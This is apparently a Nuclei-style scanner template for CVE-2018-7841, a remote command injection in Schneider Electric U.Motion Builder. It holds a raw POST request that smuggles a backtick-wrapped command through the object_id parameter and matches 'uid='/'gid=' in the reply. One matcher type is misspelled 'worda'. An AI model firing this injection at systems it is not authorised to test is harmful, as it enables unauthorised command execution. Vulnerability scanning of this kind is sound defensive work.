id: cve-2018-7841
info:
  name: Schneider Electric U.Motion Builder RCE
  author: Muhammad Waseem
  severity: critical
  description: |
    The vulnerability in Schneider Electric U.Motion Builder allows remote attackers to execute arbitrary commands via the object_id parameter of the track_import_export.php endpoint.
    This exploit bypasses previous mitigations and utilizes backticks for command injection.
  tags: rce, iot, schneider-electric
  reference:
    - https://www.rcesecurity.com/2019/05/cve-2018-7841-schneider-electric-umotion-builder-remote-code-execution-0-day/

http:
  - raw:
      - |
        POST /smartdomuspad/modules/reporting/track_import_export.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        op=export&language=english&interval=1&object_id=`id`
    matchers-condition: and
    matchers:
      - type: worda
        part: body
        words:
          - "uid="
          - "gid="
      - type: word
        part: header
        words:
          - "application/json"
      - type: status
        status:
          - 200
